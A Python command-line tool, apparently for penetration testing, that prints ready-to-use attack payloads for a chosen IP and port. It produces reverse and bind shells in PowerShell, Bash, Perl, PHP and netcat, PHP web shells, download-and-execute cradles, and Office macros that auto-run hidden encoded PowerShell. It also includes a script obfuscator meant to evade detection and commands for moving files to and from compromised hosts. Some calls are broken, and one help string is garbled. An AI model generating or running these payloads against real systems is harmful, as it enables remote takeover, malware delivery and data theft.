#!/usr/bin/python3

import sys
import subprocess
from base64 import b64encode
import argparse
import re
import string
import random
import os
import re
import ast
import time
import shutil
import random
import shlex
import string
import configparser
import fileinput
import banner


# --macro payload number of chars per line
chunk_size=32
use_macro = False
use_obfuscate = False

var = True
par = True
funct = True

lower_Reserverd = []

current_dir = os.path.dirname(os.path.abspath(__file__))
wordList = os.path.join(current_dir, 'wordList.txt')

def print_listener(port):

    print("\n********** Connectivity **********\n")
    print("tcpdump -i tun0 icmp -n")
    print("\n********** Listener **********\n")
    print(f"stty raw -echo; (stty size; cat) | nc -lvnp {port}")
    print(f"rlwrap -cAr nc -nlvp {port}")

def print_tty():
    print("\n********** tty **********\n")
    print(f"script /dev/null -c bash")
    print(f"ctrl + z")
    print(f"stty raw -echo; fg")
    print(f"export TERM=xterm; reset xterm")

    print("\n********** python tty **********\n")
    print(f"""python3 -c 'import pty; pty.spawn("/bin/bash")'""")

    print("\n********** PowerShell payload b64 encode **********\n")
    print(f"echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo")

    print("\n*******************************************************")
    print("                      PAYLOADS                    ")
    print("*******************************************************")






def build(payload):
    # Codificar la cadena en UTF-16LE
    string2 = payload.encode("utf-16le")
    
    # Ejecutar el comando base64
    process = subprocess.Popen(
        "base64 -w 0; echo", 
        shell=True, 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE
    )
    
    # Enviar los datos al proceso y obtener la salida
    stdout, stderr = process.communicate(input=string2)
    
    # Verificar si hubo errores
    if process.returncode != 0:
        raise RuntimeError(f"Command failed with error: {stderr.decode('utf-8')}")
    
    # Decodificar y retornar la salida
    b64 = stdout.decode('utf-8').strip()
    return b64


def macro(pay):
            
    size = chunk_size - 1
    chunks = [pay[i:i+size] for i in range(0, len(pay), size)]
            
    for i, chunk in enumerate(chunks):
        #print(f"Trozos {i+1}: {chunk}")
        if i == 0:
            print(f"Sub AutoOpen()")
            print(f"\tMyMacro")
            print(f"End Sub\n")
            print("Sub Document_Open()")
            print("\tMyMacro")
            print("End Sub\n")

            print("Sub MyMacro()")
            print(f"\tDim Str As String\n")

            print(f"\tStr = Str + \"powershell.exe -nop -w hidden -enc {chunk}\"")
        else:
            print(f"\tStr = Str + \"{chunk}\"")

    print(f'\n\tCreateObject("Wscript.Shell").Run Str')
    print(f'End Sub')


### OBFUSCATE ONELINER 

def obfuscate(pay):

    script = pay
    var_dict = {}
    pattern = re.compile(r'(?!\$PSHOME)(\$[A-Za-z0-9]+)')

    def replace_var(match):
        var_name = match.group(1)
        if var_name not in var_dict:
            var_dict[var_name] = f'${"".join(random.choices(string.ascii_letters + string.digits, k=10))}'
        return var_dict[var_name]

    script = pattern.sub(replace_var, script)

    # Replace iex with i''ex
    pattern = re.compile(r'iex')
    script = pattern.sub("i''ex", script)

    # Replace PS with <:Random uuid):>
    pattern = re.compile(r'\bPS\b')

    def replace_ps(match):
        return f'<:{"".join(random.choices(string.ascii_letters + string.digits, k=10))}:>'

    script = pattern.sub(replace_ps, script)

    # Replace IP and port in script
    #script = script.replace("'*LHOST*',*LPORT*", f"'{ip}',{port}")

    # Convert IP addresses to hex
    pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')

    def ip_to_hex(match):
        return '0x' + ''.join(f'{int(x):02x}' for x in match.group(0).split('.'))

    script = pattern.sub(ip_to_hex, script)

    # Convert Port Number to hex - Not matching 65535
    pattern = re.compile(r'\b(?!65535)([1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])\b')

    def port_to_hex(match):
        port_number = int(match.group())
        hex_value = hex(port_number)
        return hex_value

    script = pattern.sub(port_to_hex, script)
    return script



def print_powershell(ip, port, use_macro, use_obfuscate):

    print("\n\n********** Powershell reverse shell oneliner **********\n")
    pay = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
    print(pay)
    
    if use_obfuscate:
        pay = obfuscate(pay)

    pay = build(pay)
        
    if use_macro:
        print("\n\n********** Powershell reverse shell base64 Macro **********\n")
        macro(pay)
    else:
        print("\n\n********** Powershell reverse shell base64 **********\n")
        print(f"powershell -nop -w hidden -enc {pay}")


def print_powercat(ip, port, use_macro, use_obfuscate):

    file = "powercat.ps1"

    if not os.path.exists(file):
        print("powercat.ps1 no encontrado. Descargando...")
        subprocess.run(["wget", "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"], check=True)
    else:
        print("powercat.ps1 ya está presente en el directorio.")
    

    if use_obfuscate:
        file = pyfuscate(file, var, par, funct)
        ps1 = os.path.basename(file)
        #print(file)
        #print(ps1)
    
    print("\n********** PowerCat payload **********\n")
    payload = f"{ps1} -c {ip} -p {port} -e powershell"
    print(payload)

    print("\n********** PowerCat payload b64**********\n")
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** PowerCat Download & IEX **********\n")
    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}')"
    print(payload)

    print("\n********** PowerCat Download & IEX b64 **********\n")
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** PowerCat Download, IEX & Execution **********\n")
    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}'); powercat -c {ip} -p {port} -e powershell"
    print(payload)
    p64 = build(payload)

    if use_macro:
        print("\n\n********** Powercat reverse shell base64 Macro **********\n")
        macro(p64)
    else:
        print("\n\n********** Powercat Download, IEX & Execution base64 **********\n")
        print(f"powershell -nop -w hidden -enc {p64}")


    print(f"\n\n\n\tDONT'T FORGET !!")
    print(f"\trlwrap -cAr nc -nlvp {port}")
    print(f"\tpython3 -m uploadserver 80")



def print_conpty(ip, port, rows, columns, use_macro, use_obfuscate):

    print("\n********** ConPtyShell RevShell **********\n")
    pay = f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
    print(pay)
    
    print("\n********** ConPtyShell RevShell b64 **********\n")
    if use_obfuscate:
        pay = obfuscate(pay)
    pay = build(pay)
    print(f"powershell -nop -w hidden -enc {pay}")

    print("\n********** ConPtyShell Download & IEX **********\n")
    pay = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')"
    print(pay)
    
    print("\n********** ConPtyShell Download & IEX b64 **********\n")
    if use_obfuscate:
        pay = obfuscate(pay)

    pay = build(pay)
    print(f"powershell -nop -w hidden -enc {pay}")

    print("\n********** ConPtyShell Download, IEX & Execution **********\n")
    pay = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
    print(pay)
    
    if use_obfuscate:
        pay = obfuscate(pay)

    pay = build(pay)

    if use_macro:
        print("\n\n********** ConPTY reverse shell base64 Macro **********\n")
        macro(pay)
    else:
        print("\n\n********** ConPtyShell Download, IEX & Execution base64 **********\n")
        print(f"powershell -nop -w hidden -enc {pay}")


    print(f"\n\n\n\tDONT'T FORGET !!")
    print(f"\trlwrap -cAr nc -nlvp {port}")
    print(f"\tpython3 -m uploadserver 80")


def print_nishang(ip, port, use_macro):

    print("\n********** Nishang payload **********\n")
    payload = f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
    print(payload)

    print("\n********** Nishang payload b64**********\n")
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** Nishang Download & IEX **********\n")
    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1')"
    print(payload)

    print("\n********** Nishang Download & IEX b64 **********\n") 
    p64 = build(payload)
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** Nishang Download & Execution **********\n")
    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
    print(payload)
    p64 = build(payload)
    
    if use_macro:
        print("\n\n********** Nishang reverse shell base64 Macro **********\n")
        macro(p64)
    else:
        print("\n\n********** Nishang Download, IEX & Execution base64 **********\n")
        print(f"powershell -nop -w hidden -enc {p64}")


    print(f"\n\n\n\tDONT'T FORGET !!")
    print(f"\trlwrap -cAr nc -nlvp {port}")
    print(f"\tpython3 -m uploadserver 80\n")




def print_perl(ip, port):

    print("\n********** Perl **********\n")
    perl_payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    print(perl_payload)


def print_php(ip, port):

    php_payloads = [
        """<?php
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
  }
?>""",
        '<%3fphp+if(isset($_REQUEST[\'cmd\'])){+echo+"<pre>"%3b+$cmd+%3d+($_REQUEST[\'cmd\'])%3b+system($cmd)%3b+echo+"</pre>"%3b+die%3b+}+%3f>',
        '<?php echo system($_GET[\'cmd\']); ?>',
        '<%3fphp+echo+system($_GET[cmd])%3b+%3f>'
    ]
    for payload in php_payloads:
        print(payload)

    print(f"\nphp -r '$sock=fsockopen('{ip}',{port});exec('/bin/sh <&3 >&3 2>&3');'")

def print_bash(ip, port):

    print("\n\n\n********** Bash **********\n")
    bash_payloads = [
        f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        f"bash+-c+'bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261'",
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        f"rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20{ip}%20{port}%20%3E/tmp/f",
        f"nc {ip} {port} -e /bin/sh"
    ]
    for payload in bash_payloads:
        print(payload)


def print_nc(ip, port):
    print("\n********** Netcat Bind Shell **********\n")
    print("Linux:\n")
    print(f"\tnc -nlvp {port} -e /bin/bash")
    print(f"\tnc {ip} {port}\n")
    print("Windows:\n")
    print(f"\tnc.exe -nlvp {port} -e cmd.exe")
    print(f"\tnc {ip} {port}")

    print("\n********** Netcat Reverse Shell **********\n")
    print("Linux:\n")
    print(f"\twhich /usr/bin/nc")
    print(f"\tnc -e /bin/bash {ip} {port}\n")
    print("Windows:\n")
    print(f"\tnc.exe -e cmd {ip} {port}")
    print(f"\t.\\nc64.exe -e powershell {ip} {port}\n")

    print(f"More shells at: /usr/share/webshells\n")

def print_paths():

        print("\n********** Windows **********\n")
        print(f"C:\Windows\Tasks") 
        print(f"C:\Windows\Temp")
        print(f"C:\windows\\tracing")
        print(f"C:\Windows\Registration\CRMLog")
        print(f"C:\Windows\System32\FxsTmp")
        print(f"C:\Windows\System32\com\dmp")
        print(f"C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
        print(f"C:\Windows\System32\spool\PRINTERS")
        print(f"C:\Windows\System32\spool\SERVERS")
        print(f"C:\Windows\System32\spool\drivers\color")
        print(f"C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter")
        print(f"C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)")
        print(f"C:\Windows\SysWOW64\FxsTmp")
        print(f"C:\Windows\SysWOW64\com\dmp")
        print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter")
        print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System")

        
        print("\n********** Linux **********\n")
        print(f"find / -writable -type d 2>/dev/null")
        print(f"/tmp")
        print(f"/dev/shm")

        print("\n********** Grant perm **********\n")
        print(f"icacls C:\Windows\Temp /grant Everyone:(OI)(CI)F")
        print(f"chmod +w .")



def print_trans(ip, port, protocol, file):


    
    def ftp(ip, port):
        print(f"python -m pyftpdlib -p{port} -w")
        print(f"ftp {ip}")

    def scp(ip, file, port):

        print(f"To copy a file over from local host to a remote host")
        print(f"scp ./{file} user@{ip}:/tmp/{file} -p {port}")
        print(f"To copy a file from a remote host to your local host")
        print(f"scp user@{ip}:/tmp/{file} ./{file}")
        print(f"To copy over a directory from your local host to a remote host")
        print(f"scp -r directory user@{ip}:./{file}")

    def socat(ip, port, file):
        print(f"socat -u FILE:'{file}' TCP-LISTEN:{port},reuseaddr")
        print(f"socat -u TCP:{ip}:{port} STDOUT > {file}")


    def nc(ip, port, file):

        print(f"\n********** Listener **********\n")
        print(f"nc -nlvp {port} > {file}")

        print(f"\n********** Send **********\n")
        print(f"cat < {file} > /dev/tcp/{ip}/{port}")
        print(f"nc -w 3 {ip} {port} < {file}")


    def http(ip, port, file):

        port_f = f":{port}"
        print("\n********** HTTP **********\n")

        print("\n********** Listeners **********\n")

        print(f"php -S 0.0.0.0{port_f}")
        print("ruby -run -e httpd . -p {port}")

        print(f"python -m SimpleHTTPServer {port}")
        print(f"python2 -m SimpleHTTPServer {port}")
        print(f"python3 -m http.server {port}")

        print(f"python3 -m uploadserver {port}")
        print(f"python3 -m uploadserver --basic-auth $SUDO_USER:Password123")
        
        print("\n********** Upload **********\n")
        print(f"curl -X POST http://{ip}{port_f}/upload -F 'files=@{file}'")


        print("\n********** Windows Download **********\n")
        print(f"certutil.exe -f -urlcache -split http://{ip}{port}/{file}")
        print(f"certutil -decode payload.b64 payload.dll")
        print(f"certutil -encode payload.dll payload.b64")
        print(f"curl http://{ip}{port_f}/{file} -o {file}")
        print(f"wget http://{ip}{port_f}/{file} -OutFile {file}")
        print(f"iwr -uri http://{ip}{port_f}/{file} -OutFile {file}")
        print(f"iwr -UseBasicParsing http://{ip}{port_f}/{file}")
        print(f"enable TLS:")
        print(f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12")

        print("\n********** Linux Download **********\n")
        print(f"wget {ip}:{port} {file}")
        print(f"curl http://{ip}:{port}/{file} --output {file}")

    def smb(ip, file, port):

        print("\n********** SMB share **********\n\n")
        print(f"wsgidav --host=0.0.0.0 --port={port} --auth=anonymous --root /home/$SUDO_USER/webdav")
        print(f"impacket-smbserver share $(pwd) -smb2support")
        print(f"smbserver.py -smb2support share .")

        print("Bring from the remote host to our machine")
        print(f"copy .\{file} \\{ip}\share\{file}")
        print(f"Upload to remote host")
        print(f"copy \\{ip}\share\{file} .\{file}")
       
        print("\nCreate a logical unit")
        print(f"net use x: \\{ip}\share /user:$SUDO_USER Password123")
        print("Bring from the remote host to our machine")
        print(f"copy .\{file} x:\{file}")
        print(f"Upload to remote host")
        print(f"copy x:\{file} .\{file}")

    if protocol == "-paths":
        paths()
    elif protocol == "-installs":
        installs()
    elif protocol == "-ftp":
        ftp(ip, port)
    elif protocol == "-scp":
        scp(ip, port, file)
    elif protocol == "-socat":
        socat(ip, port, file)
    elif protocol == "-nc":
        nc(ip, port, file)
    elif protocol == "-http":
        http(ip, port, file)
    elif protocol == "-smb":
        smb(ip, file, port)
    else:
        print(f"Protocol '{protocol}' not recognized.")


def shellpy_help():
    print("Shells")
    print("\n\tUsage: shellpy <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
    print("\n\tShells types: \n\n\t\t-Powershell \n\t\t-nishang \n\t\t-conpty \n\t\t-powercat \n\t\t-perl \n\t\t-nc \n\t\t-bash \n\t\t-php")
    print(f"\t\t--macro provides a base64 powershell payload ready to load as a macro, this option can only be used with -powercat, -nishang, -powershell, or -conpty.")
    print("\n\tExamples:\n")
    print(f"\t\tshellpy 192.168.1.72 4444 -php")
    print(f"\t\tshellpy 192.168.1.72 4444 -powershell")
    print(f"\t\tshellpy 192.168.1.72 4444 -nishang --macro")
    print(f"\t\tshellpy 192.168.1.72 4444 -powershell --macro --obfuscate")
    print(f"\t\tshellpy 192.168.1.72 4444 -conpty 54 118")

    print(f"\n\tFile transfer")
    print("\n\tUsage: shell <IP> <PORT> -trans <PROTOCOL> <FILE>")
    print("\n\tThe file transfer functions require installing the following libraries:")
    print("\n\t\tpip3 install wsgidav")
    print("\t\tpip install pyftpdlib")
    print("\t\tpip install updog")
    print("\t\tpython3 -m pip install --user uploadserver")
    print("\n\tTransfers: \n\n\t\t-paths \n\t\t-installs \n\t\t-ftp \n\t\t-scp \n\t\t-socat \n\t\t-nc \n\t\t-http \n\t\t-smb ")
    print("\n\tExamples:\n")
    print(f"\t\tshellpy -paths")
    print(f"\t\tshellpy 192.168.45.170 4444 -trans -smb rubeus.exe")
    print(f"\t\tshellpy 192.168.45.170 4444 -trans -http mimikatz.exe")
    
    sys.exit(1)






### PYFUSCATE



def printR(out): print("\033[91m{}\033[00m" .format("[!] " + out)) 
def printG(out): print("\033[92m{}\033[00m" .format("[*] " + out)) 
def printY(out): print("\033[93m{}\033[00m" .format("[+] " + out)) 
def printP(out): print("\033[95m{}\033[00m" .format("[-] " + out)) 

def realTimeMuxER(command):
    p = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
    while True:
        output = p.stdout.readline().decode()
        if output == '' and p.poll() is not None:
            break
        if output:
            print(output.strip())
    rc = p.poll()

def removeJunk(oF):
    # general cleanup 
    cmd = "sed -i -e \'/<#/,/#>/c\\\\\' " + oF
    realTimeMuxER(cmd)
    cmd = "sed -i -e \'s/^[[:space:]]*#.*$//g\' " + oF
    realTimeMuxER(cmd)
    cmd = "sed -i \'/^$/d\' " + oF
    realTimeMuxER(cmd)

def useSED(DICT, oF):
    for var in DICT:
        new = str(DICT.get(var))
        cmd = "sed -i -e \'s/" + var +'\\b' + "/" + new + "/g\' " + oF
        realTimeMuxER(cmd)

def THEreplacER(DICT, iF, oF):
    iFHandle = open(iF, 'r')
    ofHandle = open(oF, 'w')
    regex = r'(\$\w{3,})'
    lower_DICT = list(map(lambda x:x.lower(),DICT))
    # For var replace with Dictionary value
    for line in iFHandle:
        v = re.findall(regex,line)
        if not v:
            #print("Not: " + line)
            ofHandle.write(line + "\n")
            ofHandle.flush()
        else:
            for var in v:
                if var.lower() in lower_DICT:
                    new = str(DICT.get(var))
                    #print("Replacing " + var + " with " + new)
                    ofHandle.write(line.replace(var, new) + "\n")
                    ofHandle.flush()
                else:
                    #print(var)
                    ofHandle.write(line + "\n")
                    ofHandle.flush()

    iFHandle.close()
    ofHandle.close()

def findCustomParams(iFile,oFile,VARs):
    PARAMs = {}
    READ = False
    start = 0
    end = 0
    regex = r'([\$-]\w{4,})'
    ofHandle = open(oFile, 'w')

    with open(iFile, "r") as f:
        for line in f:
            line = line.strip()

            if re.search(r'\bparam\b', line, re.I):
                # Ok we are at the begining of a custum parameter
                READ = True

                # The open paren is on another line so move until we find it
                start = start + line.count('(')
                if start == 0:
                    continue

                end   = end + line.count(')')

                v = re.findall(regex,line)
                for i in v:
                    if i.lower() not in lower_Reserverd and i not in PARAMs:
                        # Lets check to see if this has been replaced already
                        new = VARs.get(i)
                        if not new:
                            continue
                        new = " -" + new[1:]
                        old = " -" + i[1:]
                        PARAMs[old] = new
                        ofHandle.write("Replacing: " + old + " with: " + new + "\n")

                # If the params are all on one line were done here
                if start != 0 and start == end:
                    start = 0
                    end = 0
                    READ = False
                    continue
                
            # These are the custom parameters
            elif READ:
                v = re.findall(regex,line)
                for i in v:
                    if i.lower() not in lower_Reserverd and i not in PARAMs:
                        new = VARs.get(i)
                        if not new:
                            continue
                        new = " -" + new[1:]
                        old = " -" + i[1:]
                        PARAMs[old] = new
                        ofHandle.write("Replacing: " + old + " with: " + new + "\n")

                start = start + line.count('(')
                end   = end + line.count(')')
                if start != 0 and start == end:
                    start = 0
                    end = 0
                    READ = False

            # Keep moving until we have work
            else:
                continue

    printY("Parameters Replaced : " + str(len(PARAMs)))

    return PARAMs

def findVARs(iFile,lFile):
    VARs = {}
    vNum = 9999
    regex = r'(\$\w{6,})'
    ofHandle = open(lFile, 'w')

    with open(iFile, "r") as f:
        for line in f:
            v = re.findall(regex,line)
            for i in v:
                if i in VARs:
                    continue
                elif i.lower() not in lower_Reserverd:
                    # Powershell vars are case insensitive
                    lowerVARS = {k.lower(): v for k, v in VARs.items()}
                    if i.lower() in lowerVARS:
                        new = lowerVARS.get(i.lower())
                        ofHandle.write("Replacing: " + i + " with: " + new + "\n")
                        VARs[i] = new
                    else:
                        vNum = 99
                        new = "$" + ''.join([random.choice(string.ascii_letters) for n in range(8)])
                        VARs[i] = new + str(vNum)
                        ofHandle.write("Replacing: " + i + " with: " + new + "\n")
                        vNum += 1

    # return dict of variable and their replacements
    printY("Variables Replaced  : " + str(len(VARs)))
    return VARs

def findFUNCs(iFile,lFile):

    FUNCs = {}
    ofHandle = open(lFile, 'w')
    with open(iFile, "r") as f:
        for line in f:
            funcMatch = re.search(r'^\s*Function ([a-zA-Z0-9_-]{6,})[\s\{]+$',line, re.IGNORECASE)
            if funcMatch and funcMatch.group(1) not in FUNCs: 
                if funcMatch.group(1) == "main":
                    continue
                vNum = 9999
                new = randomString(wordList)
                FUNCs[funcMatch.group(1)] = new
                ofHandle.write("Replacing: " + funcMatch.group(1) + " with: " + str(new) + "\n")
                vNum += 1
    # return dict of variable and their replacements
    printY("Functions Replaced  : " + str(len(FUNCs)))
    return FUNCs

def randomString(iFile):
    with open(iFile, "r") as f:
        line = next(f)
        for num, aline in enumerate(f, 2):
          if random.randrange(num): continue
          line = aline
        string = ''.join(e for e in line if e.isalnum())
        return string

def pyfuscate(file, var, par, func):
    
    iFile = file

    printR("Obfuscating: " + iFile)
    ts = time.strftime("%m%d%Y_%H_%M_%S", time.gmtime())
    oDir = "." + os.path.dirname(iFile) + "/" + ts
    os.mkdir( oDir );
    oFile = oDir + "/" + ts + ".ps1"
    vFile = oDir + "/" + ts + ".variables"
    fFile = oDir + "/" + ts + ".functions"
    pFile = oDir + "/" + ts + ".parameters"
    shutil.copy(iFile, oFile)

    obfuVAR     = dict()
    obfuPARMS   = dict()
    obfuFUNCs   = dict()

    # Remove White space and comments
    removeJunk(oFile)

    # Obfuscate Variables
    if (var):
        obfuVAR = findVARs(iFile,vFile) 
        useSED(obfuVAR, oFile)
        printP("Obfuscated Variables located  : " + vFile)

    # Obfuscate custom parameters
    if (par):
        obfuPARMS = findCustomParams(iFile, pFile, obfuVAR)
        useSED(obfuPARMS, oFile)
        printP("Obfuscated Parameters located : " + pFile)

    # Obfuscate Functions
    if (func):
        obfuFUNCs = findFUNCs(iFile, fFile)
        useSED(obfuFUNCs, oFile)

        # Print the Functions
        print("")
        print("Obfuscated Function Names")
        print("-------------------------")     
        sorted_list=sorted(obfuFUNCs)
        for i in sorted_list:
            printG("Replaced " + i + " With: " + obfuFUNCs[i])
        print("")    
        printP("Obfuscated Functions located  : " + fFile)

    printP("Obfuscated script located at  : " + oFile)
    return oFile




def main(use_macro, use_obfuscate):

    if len(sys.argv) < 2:
        shellpy_help()

    ip = sys.argv[1]
    if ip == "-paths":
        print_paths()
        sys.exit(0)

    if len(sys.argv) < 4:
        shellpy_help()
  
    ip = sys.argv[1]
    port = sys.argv[2]
    shell_type = sys.argv[3].lower()

    if shell_type == "-trans":
        
        if len(sys.argv) < 6:
            shellpy_help()
        else:
            protocol = sys.argv[4].lower()
            file = sys.argv[5]
       
    else:

        if '--macro' in sys.argv:
            use_macro = True
            sys.argv.remove('--macro')

        if '--obfuscate' in sys.argv:
            use_obfuscate = True
            sys.argv.remove('--obfuscate')

        if len(sys.argv) > 4:
            try:
                rows = int(sys.argv[4])
                cols = int(sys.argv[5])
            except (IndexError, ValueError):
                print("Usage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
                print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0ipowercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
                sys.exit(1)
        else:
            output = subprocess.check_output(["stty", "size"]).decode().strip()
            rows, cols = map(int, output.split())

        if use_macro or use_obfuscate:
            if shell_type not in ['-powercat', '-nishang', '-powershell', '-conpty']:
                print("Error: --macro can only be used with -powercat, -nishang, -powershell, or -conpty.")
                sys.exit(1)

        print_listener(port)
        print_tty()

    if shell_type == "-powershell":
        print_powershell(ip, port, use_macro, use_obfuscate)
    elif shell_type == "-powercat":
        print_powercat(ip, port, use_macro, use_obfuscate)
    elif shell_type == "-nishang":
        print_nishang(ip, port, use_macro, use_obfuscate)
    elif shell_type == "-conpty":
        print_conpty(ip, port, rows, cols, use_macro, use_obfuscate)
    elif shell_type == "-php":
        print_php(ip, port)
    elif shell_type == "-bash":
        print_bash(ip, port)
    elif shell_type == "-perl":
        print_perl(ip, port)
    elif shell_type == "-nc":
        print_nc(ip, port)
    elif shell_type == "-trans":
        print_trans(ip, port, protocol, file)
    else:
        print(f"Shell type '{shell_type}' not recognized.")


if __name__ == "__main__":
    
    main(use_macro, use_obfuscate)
